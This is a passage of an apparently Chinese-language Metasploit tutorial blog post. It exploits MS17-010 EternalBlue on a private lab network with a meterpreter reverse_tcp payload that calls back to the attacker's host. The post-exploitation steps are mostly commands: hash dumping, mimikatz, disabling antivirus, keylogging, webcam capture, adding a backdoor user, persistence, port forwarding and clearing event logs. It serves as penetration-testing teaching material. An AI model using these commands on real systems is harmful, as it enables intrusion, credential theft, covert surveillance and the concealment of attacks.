  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set rhosts <span class="number">192.168</span>.<span class="number">100.100</span>-<span class="number">192.168</span>.<span class="number">100.190</span></span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/gHAle32vw7NkyGZ.png" alt="img" /><br />
4、对上面设置的ip范围内的主机进行攻击：<br />
注：有+号的就是可能存在漏洞的主机，这里有2个主机存在漏洞<br />
命令：</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/UkvFTdEt4VlRrYz.png" alt="img" /></p>
<h4 id="63-使用exploit漏洞利用模块对漏洞进行利用"><a class="markdownIt-Anchor" href="#63-使用exploit漏洞利用模块对漏洞进行利用"></a> 6.3 使用<code>Exploit漏洞利用模块</code>对漏洞进行利用：</h4>
<p>1、选择漏洞攻击模块，对漏洞进行利用：<br />
命令：</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">exploit</span>/<span class="title">windows</span>/<span class="title">smb</span>/<span class="title">ms17_010_eternalblue</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/et9PbkSQ514pGWJ.png" alt="img" /></p>
<p>2、查看这个漏洞的信息：<br />
命令：</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info：  <span class="comment">#查看这个漏洞的信息</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/kemlaZgJz6bU5qQ.png" alt="img" /></p>
<p>3、查看可攻击的系统平台，显示当前攻击模块针对哪些特定操作系统版本、语言版本的系统：<br />
命令：</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show targets  </span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/r7cLNfyMTiuloGV.png" alt="img" /><br />
注：这里只有一个，有些其他的漏洞模块对操作系统的语言和版本要求的很严，比如MS08_067，这样就要我们指定目标系统的版本的。如果不设置的话，MSF会自动帮我们判断目标操作系统的版本和语言(利用目标系统的指纹特征)。</p>
<h4 id="64-payload攻击载荷模块"><a class="markdownIt-Anchor" href="#64-payload攻击载荷模块"></a> 6.4 Payload攻击载荷模块：</h4>
<blockquote>
<p>攻击载荷是我们期望在目标系统在被渗透攻击之后完成的实际攻击功能的代码，成功渗透目标后，用于在目标系统上运行任意命令。</p>
</blockquote>
<p>1、查看攻击载荷：<br />
命令：</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show  payloads  <span class="comment">#该命令可以查看当前漏洞利用模块下可用的所有Payload</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/pqoDx8znRaHjFli.png" alt="img" /><br />
2、设置攻击载荷：<br />
命令：</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/dYtz8VwEoqMebOu.png" alt="img" /></p>
<p>3、查看模块需要配置的参数：<br />
命令：</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show  options</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/MOEih7m8wPr2YH4.png" alt="img" /></p>
<p>4、设置攻击载荷参数：<br />
命令：</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set RHOST <span class="number">192.168</span>.<span class="number">100.158</span>   <span class="comment">#设置RHOST，也就是要攻击主机的ip</span></span><br><span class="line">set LHOST <span class="number">192.168</span>.<span class="number">100.132</span>   <span class="comment">#设置LHOST，也就是我们主机的ip，用于接收从目标机弹回来的shell</span></span><br><span class="line">set lport <span class="number">6666</span>              <span class="comment">#设置lport，也就是我们主机的端口，反弹shell到这个端口；如果我们这里不设置lport的话，默认是4444端口监听；</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/T73eXdl5kFcoM1A.png" alt="img" /></p>
<p>5、进行攻击：</p>
<p><img src="https://s2.loli.net/2023/03/16/pngPTKAZDRjkQ5l.png" alt="img" /></p>
<h3 id="7-后渗透阶段"><a class="markdownIt-Anchor" href="#7-后渗透阶段"></a> 7. 后渗透阶段：</h3>
<p>运行了<code>exploit命令</code>之后，我们开启了一个<code>reverse TCP监听器</code>来监听本地的<code>6666</code>端口，即我（攻击者）的本地主机地址（LHOST）和端口号（LPORT）。运行成功之后，我们将会看到命令提示符 <code>meterpreter &gt;</code> 出现：</p>
<p><img src="https://s2.loli.net/2023/03/16/8UTBoVwK4qcSghJ.png" alt="img" />Meterpreter的命令用法：</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line">Meterpreter &gt; ?</span><br><span class="line">==========================================</span><br><span class="line">核心命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line">?                             帮助菜单</span><br><span class="line">background                    把当前会话挂到后台运行</span><br><span class="line">bg                            background命令的别名</span><br><span class="line">bgkill                        杀死后台meterpreter 脚本</span><br><span class="line">bglist                        列出正在运行的后台脚本</span><br><span class="line">bgrun                         执行一个meterpreter脚本作为后台线程</span><br><span class="line">channel                       显示信息或控制活动频道</span><br><span class="line">close                         关闭一个频道</span><br><span class="line">detach                        分离Meterpreter会话（用于 http/https）</span><br><span class="line">disable_unicode_encoding      禁用 unicode 字符串的编码</span><br><span class="line">enable_unicode_encoding       启用 unicode 字符串的编码</span><br><span class="line"><span class="keyword">exit</span>                          终止 Meterpreter 会话</span><br><span class="line">get_timeouts                  获取当前会话超时值</span><br><span class="line">guid                          获取会话 GUID</span><br><span class="line">help                          帮助菜单</span><br><span class="line">info                          显示有关 Post 模块的信息</span><br><span class="line">irb                           在当前会话中打开一个交互式 Ruby shell</span><br><span class="line">load                          加载一个或多个 Meterpreter 扩展</span><br><span class="line">machine_id                    获取连接到会话的机器的 MSF ID</span><br><span class="line">migrate                       将服务器迁移到另一个进程</span><br><span class="line">pivot                         管理枢轴侦听器</span><br><span class="line">pry                           在当前会话上打开 Pry 调试器</span><br><span class="line">quit                          终止 Meterpreter 会话</span><br><span class="line">read                          从通道读取数据</span><br><span class="line">resource                      运行存储在文件中的命令</span><br><span class="line">run                           执行一个 Meterpreter 脚本或 Post 模块</span><br><span class="line">secure                       （重新）协商会话上的 TLV 数据包加密</span><br><span class="line">sessions                      快速切换到另一个会话</span><br><span class="line">set_timeouts                  设置当前会话超时值</span><br><span class="line">sleep                         强制 Meterpreter 安静，然后重新建立会话</span><br><span class="line">ssl_verify                    修改 SSL 证书验证设置</span><br><span class="line">transport                     管理运输机制</span><br><span class="line"><span class="keyword">use</span>                           不推荐使用的<span class="title">load</span>命令别名</span><br><span class="line"><span class="title">uuid</span>                          获取当前会话的 <span class="title">UUID</span></span><br><span class="line"><span class="title">write</span>                         将数据写入通道</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line"><span class="title">Stdapi</span>：文件系统命令</span><br><span class="line">==========================================</span><br><span class="line"></span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line"><span class="title">cat</span>                           将文件内容读到屏幕上</span><br><span class="line"><span class="title">cd</span>                            切换目录</span><br><span class="line"><span class="title">checksum</span>                      检索文件的校验和</span><br><span class="line"><span class="title">cp</span>                            将源复制到目标</span><br><span class="line"><span class="title">del</span>                           删除指定文件</span><br><span class="line"><span class="title">dir</span>                           列出文件（<span class="title">ls</span> 的别名）</span><br><span class="line"><span class="title">download</span>                      下载文件或目录</span><br><span class="line"><span class="title">edit</span>                          编辑文件</span><br><span class="line"><span class="title">getlwd</span>                        打印本地工作目录</span><br><span class="line"><span class="title">getwd</span>                         打印工作目录</span><br><span class="line"><span class="title">lcd</span>                           更改本地工作目录</span><br><span class="line"><span class="title">lls</span>                           列出本地文件</span><br><span class="line"><span class="title">lpwd</span>                          打印本地工作目录</span><br><span class="line"><span class="title">ls</span>                            列出文件</span><br><span class="line"><span class="title">mkdir</span>                         制作目录</span><br><span class="line"><span class="title">mv</span>                            将源移动到目标</span><br><span class="line"><span class="title">pwd</span>                           打印工作目录</span><br><span class="line"><span class="title">rm</span>                            删除指定文件</span><br><span class="line"><span class="title">rmdir</span>                         删除目录</span><br><span class="line"><span class="title">search</span>                        搜索文件</span><br><span class="line"><span class="title">show_mount</span>                    列出所有挂载点/逻辑驱动器</span><br><span class="line"><span class="title">upload</span>                        上传文件或目录</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line"><span class="title">Stdapi</span>：网络命令</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line"><span class="title">arp</span>                           显示主机 <span class="title">ARP</span> 缓存</span><br><span class="line"><span class="title">getproxy</span>                      显示当前代理配置</span><br><span class="line"><span class="title">ifconfig</span>                      显示界面</span><br><span class="line"><span class="title">ipconfig</span>                      显示接口</span><br><span class="line"><span class="title">netstat</span>                       显示网络连接</span><br><span class="line"><span class="title">portfwd</span>                       将本地端口转发到远程服务</span><br><span class="line"><span class="title">resolve</span>                       解析目标上的一组主机名</span><br><span class="line"><span class="title">route</span>                         查看和修改路由表</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line"><span class="title">Stdapi</span>：系统命令</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line"><span class="title">clearev</span>                       清除事件日志</span><br><span class="line"><span class="title">drop_token</span>                    放弃任何活动的模拟令牌。</span><br><span class="line"><span class="title">execute</span>                       执行命令</span><br><span class="line"><span class="title">getenv</span>                        获取一个或多个环境变量值</span><br><span class="line"><span class="title">getpid</span>                        获取当前进程标识符</span><br><span class="line"><span class="title">getprivs</span>                      尝试启用当前进程可用的所有权限</span><br><span class="line"><span class="title">getid</span>                         获取服务器运行的用户的 <span class="title">SID</span></span><br><span class="line"><span class="title">getuid</span>                        获取服务器运行的用户</span><br><span class="line"><span class="title">kill</span>                          终止进程</span><br><span class="line"><span class="title">localtime</span>                     显示目标系统本地日期和时间</span><br><span class="line"><span class="title">pgrep</span>                         按名称过滤进程</span><br><span class="line"><span class="title">pkill</span>                         按名称终止进程</span><br><span class="line"><span class="title">ps</span>                            列出正在运行的进程</span><br><span class="line"><span class="title">reboot</span>                        重启远程计算机</span><br><span class="line"><span class="title">reg</span>                           修改远程注册表并与之交互</span><br><span class="line"><span class="title">rev2self</span>                      在远程机器上调用 <span class="title">RevertToSelf</span>()</span><br><span class="line"><span class="title">shell</span>                         放入系统命令 <span class="title">shell</span></span><br><span class="line"><span class="title">shutdown</span>                      关闭远程计算机</span><br><span class="line"><span class="title">steal_token</span>                   尝试从目标进程窃取模拟令牌</span><br><span class="line"><span class="title">suspend</span>                       暂停或恢复进程列表</span><br><span class="line"><span class="title">sysinfo</span>                       获取有关远程系统的信息，例如 <span class="title">OS</span></span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line"><span class="title">Stdapi</span>：用户界面命令</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line"><span class="title">enumdesktops</span>                  列出所有可访问的桌面和窗口站</span><br><span class="line"><span class="title">getdesktop</span>                    获取当前的<span class="title">meterpreter</span>桌面</span><br><span class="line"><span class="title">idletime</span>                      返回远程用户空闲的秒数</span><br><span class="line"><span class="title">keyboard_send</span>                 发送击键</span><br><span class="line"><span class="title">keyevent</span>                      发送按键事件</span><br><span class="line"><span class="title">keyscan_dump</span>                  转储击键缓冲区</span><br><span class="line"><span class="title">keyscan_start</span>                 开始捕获击键</span><br><span class="line"><span class="title">keyscan_stop</span>                  停止捕获击键</span><br><span class="line"><span class="title">mouse</span>                         发送鼠标事件</span><br><span class="line"><span class="title">screenshare</span>                   实时观看远程用户桌面</span><br><span class="line"><span class="title">screenshot</span>                    抓取交互式桌面的截图</span><br><span class="line"><span class="title">setdesktop</span>                    更改<span class="title">meterpreters</span>当前桌面</span><br><span class="line"><span class="title">uictl</span>                         控制一些用户界面组件</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line"><span class="title">Stdapi</span>：网络摄像头命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line"><span class="title">record_mic</span>                    从默认麦克风录制音频 <span class="title">X</span> 秒</span><br><span class="line"><span class="title">webcam_chat</span>                   开始视频聊天</span><br><span class="line"><span class="title">webcam_list</span>                   列出网络摄像头</span><br><span class="line"><span class="title">webcam_snap</span>                   从指定的网络摄像头拍摄快照</span><br><span class="line"><span class="title">webcam_stream</span>                 从指定的网络摄像头播放视频流</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line"><span class="title">Stdapi</span>：音频输出命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line"><span class="title">play</span>                          在目标系统上播放波形音频文件 (.<span class="title">wav</span>)</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line"><span class="title">Priv</span>：权限提升命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line"><span class="title">getsystem</span>                     尝试将您的权限提升到本地系统的权限。</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line"><span class="title">Priv</span>：密码数据库命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line"><span class="title">hashdump</span>                      转储 <span class="title">SAM</span> 数据库的内容</span><br><span class="line"></span><br><span class="line">==========================================</span><br><span class="line"><span class="title">Priv</span>：<span class="title">Timestomp</span> 命令：</span><br><span class="line">==========================================</span><br><span class="line">命令                           说明</span><br><span class="line">-------                       ------------</span><br><span class="line"><span class="title">timestomp</span>                     操作文件 <span class="title">MACE</span> 属性</span><br><span class="line"></span><br><span class="line"><span class="title">meterpreter</span> &gt;</span><br><span class="line">123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171</span><br></pre></td></tr></table></figure>
<p>我们输入： <code>shell</code>即可切换到目标主机的<code>windows cmd_shell</code>里面：<br />
命令：</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell         <span class="comment">#获取目标主机的cmd_shell权限</span></span><br><span class="line">chcp <span class="number">65001</span>    <span class="comment">#这里为了避免目标主机cmd_shell字符乱码，设置目标主机命令行的字符编码，65001是UTF-8</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/2qy9ZQF1JsjYRpN.png" alt="img" /></p>
<p>要想从目标主机shell退出到<code>meterpreter</code> ，我们只需输入：<code>exit</code>:</p>
<p><img src="https://s2.loli.net/2023/03/16/LdJVD6KsIPEUaC5.png" alt="img" /></p>
<p>从<code>meterpreter</code>退出到<code>MSF框架</code>:<br />
命令：</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background   <span class="comment">#把我们获得的meterpreter会话挂载到后台运行</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/XwuztcsMFRIiJPD.png" alt="img" /><br />
查看前面获得的<code>meterpreter_shell</code>会话，最前面的数字是会话的id：<br />
命令：</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions  -l    <span class="comment">#查看获得的meterpreter_shell会话列表</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/oaFsJ85b2vYUnHz.png" alt="img" /><br />
输入sessions [id号]即可进入相应的<code>meterpreter_shell</code>中：<br />
<img src="https://s2.loli.net/2023/03/16/bif5BCrgy1ke67t.png" alt="img" /></p>
<p>输入：shell即可进入 cmd 类型的控制，再输入：powershell，即可进入 powershell 类型的控制台:</p>
<p><img src="https://s2.loli.net/2023/03/16/ETItPSMQkAbamey.png" alt="img" /></p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">sysinfo             									<span class="comment">#查看目标主机系统信息</span></span><br><span class="line">run scraper         									<span class="comment">#查看目标主机详细信息</span></span><br><span class="line">run hashdump        									<span class="comment">#导出密码的哈希</span></span><br><span class="line">load kiwi           									<span class="comment">#加载mimikatz</span></span><br><span class="line">ps                  									<span class="comment">#查看目标主机进程信息</span></span><br><span class="line">pwd                		 								<span class="comment">#查看目标当前目录(windows)</span></span><br><span class="line">getlwd              									<span class="comment">#查看目标当前目录(Linux)</span></span><br><span class="line">search -f *.jsp -d e:\                					<span class="comment">#搜索E盘中所有以.jsp为后缀的文件</span></span><br><span class="line">download  e:\test.txt  /root          					<span class="comment">#将目标机的e:\test.txt文件下载到/root目录下</span></span><br><span class="line">upload    /root/test.txt d:\test      					<span class="comment">#将/root/test.txt上传到目标机的 d:\test\ 目录下</span></span><br><span class="line">getpid             										<span class="comment">#查看当前Meterpreter Shell的进程PID</span></span><br><span class="line">migrate <span class="number">1384</span>        									<span class="comment">#将当前Meterpreter Shell的进程迁移到PID为1384的进程上</span></span><br><span class="line">idletime           		 								<span class="comment">#查看主机运行时间</span></span><br><span class="line">getuid              									<span class="comment">#查看获取的当前权限</span></span><br><span class="line">getsystem           									<span class="comment">#提权,获得的当前用户是administrator才能成功</span></span><br><span class="line">run  killav        			 							<span class="comment">#关闭杀毒软件</span></span><br><span class="line">screenshot          									<span class="comment">#截图</span></span><br><span class="line">webcam_list         									<span class="comment">#查看目标主机的摄像头</span></span><br><span class="line">webcam_snap         									<span class="comment">#拍照</span></span><br><span class="line">webcam_stream       									<span class="comment">#开视频</span></span><br><span class="line">execute 参数 -f 可执行文件   							    <span class="comment">#执行可执行程序</span></span><br><span class="line">run getgui -u test1 -p Abc123456    					<span class="comment">#创建test1用户，密码为Abc123456</span></span><br><span class="line">run getgui -e                							<span class="comment">#开启远程桌面</span></span><br><span class="line">keyscan_start                							<span class="comment">#开启键盘记录功能</span></span><br><span class="line">keyscan_dump                			 				<span class="comment">#显示捕捉到的键盘记录信息</span></span><br><span class="line">keyscan_stop                 							<span class="comment">#停止键盘记录功能</span></span><br><span class="line">uictl  disable  keyboard     							<span class="comment">#禁止目标使用键盘</span></span><br><span class="line">uictl  enable   keyboard     							<span class="comment">#允许目标使用键盘</span></span><br><span class="line">uictl  disable  mouse        							<span class="comment">#禁止目标使用鼠标</span></span><br><span class="line">uictl  enable   mouse        							<span class="comment">#允许目标使用鼠标</span></span><br><span class="line">load                        							<span class="comment">#使用扩展库</span></span><br><span class="line">run				             							<span class="comment">#使用扩展库</span></span><br><span class="line"> </span><br><span class="line">run exploit/windows/local/persistence lhost=<span class="number">192.168</span>.<span class="number">100.132</span> lport=<span class="number">8888</span>        <span class="comment">#会自动连接192.168.100.132的8888端口，缺点是容易被杀毒软件查杀</span></span><br><span class="line">portfwd add -l <span class="number">9999</span> -r <span class="number">192.168</span>.<span class="number">100.158</span> -p <span class="number">3389</span>     		<span class="comment">#将192.168.11.13的3389端口转发到本地的9999端口上，这里的192.168.100.158是获取权限的主机的ip地址</span></span><br><span class="line">clearev                       <span class="comment">#清除日志</span></span><br></pre></td></tr></table></figure>
<h4 id="71-post-后渗透模块"><a class="markdownIt-Anchor" href="#71-post-后渗透模块"></a> 7.1 Post 后渗透模块：</h4>
<blockquote>
<p>该模块主要用于在取得目标主机系统远程控制权后，进行一系列的后渗透攻击动作。</p>
</blockquote>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/migrate                			<span class="comment">#自动进程迁移</span></span><br><span class="line">run post/windows/gather/checkvm                			<span class="comment">#查看目标主机是否运行在虚拟机上</span></span><br><span class="line">run post/windows/manage/killav                			<span class="comment">#关闭杀毒软件</span></span><br><span class="line">run post/windows/manage/enable_rdp            			<span class="comment">#开启远程桌面服务</span></span><br><span class="line">run post/windows/manage/autoroute              			<span class="comment">#查看路由信息</span></span><br><span class="line">run post/windows/gather/enum_logged_on_users    		<span class="comment">#列举当前登录的用户</span></span><br><span class="line">run post/windows/gather/enum_applications       		<span class="comment">#列举应用程序</span></span><br><span class="line">run post/windows/gather/credentials/windows_autologin 	<span class="comment">#抓取自动登录的用户名和密码</span></span><br><span class="line">run post/windows/gather/smart_hashdump               	<span class="comment">#dump出所有用户的hash</span></span><br></pre></td></tr></table></figure>
<p>输入：sysinfo 查看目标主机的信息:</p>
<p><img src="https://s2.loli.net/2023/03/16/e7Psahu6JMlWn1v.png" alt="img" /></p>
<h4 id="72-查看主机是否运行在虚拟机上"><a class="markdownIt-Anchor" href="#72-查看主机是否运行在虚拟机上"></a> 7.2 查看主机是否运行在虚拟机上:</h4>
<p>查看主机是否运行在虚拟机上，可以看出主机是在虚拟机环境：<br />
命令：</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/checkvm</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/FeBlrQZCK97DAW1.png" alt="img" /></p>
<h4 id="73-关闭杀毒软件"><a class="markdownIt-Anchor" href="#73-关闭杀毒软件"></a> 7.3 关闭杀毒软件：</h4>
<p>拿到目标主机的shell后第一件事就是关闭掉目标主机的杀毒软件，通过命令：</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run  killav</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/CgJ86DLzXYr95xS.png" alt="img" /></p>
<h4 id="74-获取目标主机的详细信息"><a class="markdownIt-Anchor" href="#74-获取目标主机的详细信息"></a> 7.4 获取目标主机的详细信息：</h4>
<p>使用命令：</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run scraper </span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/EIpQJwUbYmqiSDX.png" alt="img" /></p>
<p>它将目标机器上的常见信息收集起来然后下载保存在本地</p>
<h4 id="75-访问文件系统"><a class="markdownIt-Anchor" href="#75-访问文件系统"></a> 7.5 访问文件系统：</h4>
<p>Meterpreter支持非常多的文件系统命令（基本跟Linux系统命令类似），一些常用命令如下：</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwd     <span class="comment">#查看当前目录</span></span><br><span class="line">cd      <span class="comment">#切换目标目录；</span></span><br><span class="line">cat     <span class="comment">#读取文件内容；</span></span><br><span class="line">rm      <span class="comment">#删除文件；</span></span><br><span class="line">edit    <span class="comment">#使用vim编辑文件</span></span><br><span class="line">ls      <span class="comment">#获取当前目录下的文件；</span></span><br><span class="line">mkdir   <span class="comment">#新建目录；</span></span><br><span class="line">rmdir   <span class="comment">#删除目录； </span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/MrYCpm2541gF36w.png" alt="img" /></p>
<h4 id="76-上传下载文件"><a class="markdownIt-Anchor" href="#76-上传下载文件"></a> 7.6 上传/下载文件：</h4>
<h5 id="761-下载文件"><a class="markdownIt-Anchor" href="#761-下载文件"></a> 7.6.1 下载文件：</h5>
<p>命令：</p>
  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download  file <span class="comment">#命令可以帮助我们从目标系统中下载文件</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2023/03/16/TZpRF54j2gm3oSf.png" alt="img" /></p>
<p><img src="https://s2.loli.net/2023/03/16/eOizAjMZDyua35n.png" alt="img" /></p>
<h5 id="762-上传文件"><a class="markdownIt-Anchor" href="#762-上传文件"></a> 7.6.2 上传文件：</h5>
<p>命令：</p>
